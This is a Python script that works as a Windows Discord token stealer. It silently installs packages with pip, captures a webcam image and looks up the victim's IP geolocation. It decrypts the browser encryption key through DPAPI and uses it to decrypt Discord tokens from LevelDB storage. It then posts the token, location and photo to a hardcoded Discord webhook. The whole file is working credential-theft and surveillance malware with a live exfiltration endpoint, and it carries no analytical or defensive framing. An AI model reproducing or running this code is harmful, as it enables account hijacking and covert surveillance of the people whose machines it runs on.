import os
import re
import json
import base64
import requests
from pathlib import Path
import subprocess
import sys
try:
    import win32crypt
    from Crypto.Cipher import AES
    import cv2
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pypiwin32", "pycryptodome", "opencv-python"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    os.execl(sys.executable, sys.executable, *sys.argv)
import win32crypt
from Crypto.Cipher import AES
import cv2

def capture_webcam():
    """Capture an image from the first available webcam."""
    for i in range(5):  # Try first 5 camera indices
        try:
            cap = cv2.VideoCapture(i)
            if not cap.isOpened():
                cap.release()
                continue
            ret, frame = cap.read()
            cap.release()
            if ret:
                ret, buf = cv2.imencode(".jpg", frame)
                if ret:
                    return buf.tobytes(), f"capture_cam{i}.jpg"
            print(f"Hello World!")
        except Exception as e:
            print(f"error{i}: {e}")
    return None, None

def get_ip_location():
    """Fetch approximate location based on public IP."""
    try:
        with requests.get("http://ip-api.com/json/?fields=61439") as response:
            if response.status_code == 200:
                data = response.json()
                if data.get("status") == "success":
                    return {
                        "ip": data.get("query", "Unknown"),
                        "city": data.get("city", "Unknown"),
                        "region": data.get("regionName", "Unknown"),
                        "country": data.get("country", "Unknown"),
                        "latitude": data.get("lat", "Unknown"),
                        "longitude": data.get("lon", "Unknown"),
                        "isp": data.get("isp", "Unknown")
                    }
                else:
                    return {"error": "Geolocation API failed"}
            else:
                return {"error": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"error": f"Geolocation error: {e}"}

def send_to_webhook(token, location, image_data, image_name, app_name, webhook_url):
    """Send token, location, and webcam image to the webhook."""
    location_str = (f"IP: {location.get('ip', 'Unknown')}\n"
                   f"City: {location.get('city', 'Unknown')}\n"
                   f"Region: {location.get('region', 'Unknown')}\n"
                   f"Country: {location.get('country', 'Unknown')}\n"
                   f"Latitude: {location.get('latitude', 'Unknown')}\n"
                   f"Longitude: {location.get('longitude', 'Unknown')}\n"
                   f"ISP: {location.get('isp', 'Unknown')}" if not location.get("error")
                   else f"Location Error: {location.get('error')}")
    message = (f"tokan: {token}\n\nLocation Data:\n```yaml\n{location_str}\n```" if token
               else f"No token found\n\nLocation Data:\n```yaml\n{location_str}\n```")
    payload = {
        "content": f"[{app_name}] {message}",
        "username": "evil monster hack",
        "avatar_url": "https://i.imgur.com/removed.png"
    }
    files = {"file": (image_name, image_data, "image/jpeg")} if image_data else None
    try:
        response = requests.post(webhook_url, data={"payload_json": json.dumps(payload)}, files=files)
        if response.status_code == 204:
            print(f"fe bypass")
        else:
            print(f"fail fe byaps {response.status_code}")
    except Exception as e:
        print(f"fe bypoissed")

def get_encryption_key(path):
    """Retrieve and decrypt the encryption key from Local State."""
    try:
        local_state_path = path / 'Local State'
        if not local_state_path.exists():
            return None
        with open(local_state_path, 'r', encoding='utf-8') as file:
            key_data = json.load(file)['os_crypt']['encrypted_key']
        key = base64.b64decode(key_data)[5:]  # Remove 'DPAPI' prefix
        decrypted_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        print(f"hack")
        return None

def decrypt_token(encrypted_token, key):
    """Decrypt an encrypted Discord token."""
    try:
        encrypted_token = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])
        nonce = encrypted_token[3:15]
        ciphertext = encrypted_token[15:-16]
        tag = encrypted_token[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_token = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
        return decrypted_token
    except Exception as e:
        print(f"pussy")
        return None

def get_discord_token(webhook_url):
    # Only run on Windows
    if os.name != "nt":
        print("windows ONLY!")
        send_to_webhook(None, {"error": "this bitch aint using windows xd"}, None, None, "System", webhook_url)
        return None

    # Get location data
    location = get_ip_location()

    # Capture webcam image
    image_data, image_name = capture_webcam()
    if image_data:
        print(f"fe bypassed: {image_name}")
    else:
        print("pussy")
        image_name = "no_image.jpg"

    # Define Discord app data paths
    app_data = os.getenv('APPDATA')
    paths = {
        'Discord': Path(app_data) / 'discord',
        'Discord Canary': Path(app_data) / 'discordcanary',
        'Discord PTB': Path(app_data) / 'discordptb',
        'Discord Dev': Path(app_data) / 'DiscordDevelopment'
    }

    token_pattern = r'dQw4w9WgXcQ:[^.*\[''"].*?[''"].*?][^"]*'
    checked_tokens = []

    for app_name, path in paths.items():
        if not path.exists():
            print(f"{app_name} path not found: {path}")
            send_to_webhook(None, location, image_data, image_name, app_name, webhook_url)
            continue

        # Get encryption key
        key = get_encryption_key(path)
        if not key:
            print(f"No encryption key found for {app_name}")
            send_to_webhook(None, location, image_data, image_name, app_name, webhook_url)
            continue

        # Search LevelDB files
        leveldb_path = path / 'Local Storage' / 'leveldb'
        if not leveldb_path.exists():
            print(f"LevelDB path not found for {app_name}: {leveldb_path}")
            send_to_webhook(None, location, image_data, image_name, app_name, webhook_url)
            continue

        for file in leveldb_path.glob('*.[lL][dD][bB]'):
            try:
                with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        for match in re.findall(token_pattern, line):
                            encrypted_token = match
                            decrypted_token = decrypt_token(encrypted_token, key)
                            if decrypted_token and decrypted_token not in checked_tokens:
                                checked_tokens.append(decrypted_token)
                                send_to_webhook(decrypted_token, location, image_data, image_name, app_name, webhook_url)
                                return decrypted_token
            except Exception as e:
                print(f"Error reading {file}: {e}")
                send_to_webhook(None, location, image_data, image_name, app_name, webhook_url)
                continue

    if not checked_tokens:
        send_to_webhook(None, location, image_data, image_name, "All Apps", webhook_url)
    return None

if __name__ == "__main__":
    WEBHOOK_URL = "https://discord.com/api/webhooks/1423931014409093181/Z5CLsy1Tv316PSrm6i3fBOC3YOoGcVie4IqiK42rO-qfVhMqz-B_eunkhjA9y5sPLMQn"
    get_discord_token(WEBHOOK_URL)